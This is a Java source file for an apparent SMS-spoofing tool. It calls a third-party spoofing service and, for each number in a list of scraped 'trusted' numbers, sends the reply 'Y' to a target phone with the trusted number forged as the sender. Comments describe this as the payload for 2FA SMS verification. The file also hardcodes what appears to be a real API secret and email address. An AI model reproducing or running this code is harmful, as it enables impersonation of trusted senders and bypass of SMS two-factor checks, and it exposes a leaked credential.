package uk.ac.ncl.main;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.UnsupportedEncodingException;
import java.net.HttpURLConnection;
import java.net.MalformedURLException;
import java.net.URL;
import java.text.DateFormat;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.HashMap;
import java.util.List;
import java.util.Map;

import com.google.gson.JsonObject;
import com.google.gson.JsonParser;
/**
 * Helper class which uses the in-built HTTPUrlConnection libraries to make web requests to a web API provided by https://cspoof.net and can send spoofed text messages to and from any number globally.
 * @author Rayyan Iqbal
 * @version 1.02
 * @date 25/04/2020
 */
public class API {
	/* Declarations */
	private final static String API_KEY = "xtpDBj2jxJNGpU7dFDtGfleuWajFqZ";
	private final static String API_MAIL = "rayyandev@gmail.com";
	private final static String API_URL = "https://cspoof.com/dashboard/api";
	private final static String TEXT_PAYLOAD = "Y"; // Expected payload for 2FA SMS Verification
	
	public static List<String> scrapedNumbers; // @see Value defined in Scraper.class
	private String phoneNumber;
	/* End Declarations */
	
	
	/**
	 * Constructor Method - Creates an instance of the telecommunication web sevice for a given phone number
	 * @param phoneNumber - Phone number to receive or send texts from
	 */
	public API (String phoneNumber) {
		try {
			this.phoneNumber = removePrefix(phoneNumber);
		} catch (IOException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		} // (Remove the + prefix)
	}
	

	public void sendText () throws IOException {
		// Setup variables //
		Map<String, String> parameters = new HashMap<String, String>();
		URL url;
		HttpURLConnection con = null;
		BufferedReader in = null;
		
		// Setup global parameters for web service request //
		parameters.put("to", phoneNumber);
		parameters.put("message", TEXT_PAYLOAD);
		parameters.put("api_secret", API_KEY); 	/**  AUTHENTICATION	  **/
		parameters.put("email", API_MAIL);		/**	 VARIABLES **/
		// END GLOBAL PARAMETERS //
		
	
		/* For each trusted number in list of scraped numbers */
		for (String trustedNumber : scrapedNumbers) {
			int i = 1;
			if (i == 2) {
				throw new IOException("have to quit sry");
			}
			trustedNumber = removePrefix(trustedNumber);
			parameters.put("from", trustedNumber);
			
			// Try and initalise a web request to the telecommunication web service //
			try {
				/* Setup API_URL and open connection */
				url = new URL (API_URL + ParameterStringBuilder.getParamsString(parameters)); // setup API_URL to follow parameters standard /api?parm1=X&param2=Y
				con = (HttpURLConnection) url.openConnection();
				
			// Catch any potential exceptions //
			} catch (MalformedURLException e) {
				throw new MalformedURLException("An exception has occured when processing the API_URL");
			} catch (UnsupportedEncodingException e) {
				throw new UnsupportedEncodingException("An exception has occured when converting the API_PARAMETERS to UTF-8");
			} catch (IOException e) {
				throw new IOException ("An exception has occured when accessing the API_URL (Invalid URL)");
			} 
			
			/* Read the result */
			in = new BufferedReader(new InputStreamReader(con.getInputStream()));
			String inputLine;
			StringBuffer content = new StringBuffer();
			while ((inputLine = in.readLine()) != null) {
			    content.append(inputLine);
			}
			in.close();
			con.disconnect();
			JsonParser parser = new JsonParser();
			JsonObject json = (JsonObject) parser.parse(content.toString());
			DateFormat dateFormat = new SimpleDateFormat("[HH:mm:ss]: ");
			Date date = new Date();
			App.log.append(dateFormat.format(date));
			App.log.append("SMS Status: " + json.get("status_info") + " from " + trustedNumber + " to " + json.get("to"));
			App.log.append("\n");
			
		}
	}
	
	
	/**
	 * Removes the (+) prefix from a phone number of format +4479XXXXXX
	 * @param phoneNumber - Phone number to remove prefix from
	 * @return New phone string with the plus prefix removed
	 * @throws IOException 
	 */
	public String removePrefix (String phoneNumber) throws IOException {
		if (phoneNumber.contains("+"))
			return phoneNumber.substring(1);
		else throw new IOException("Invalid phone number");
		
	}
}
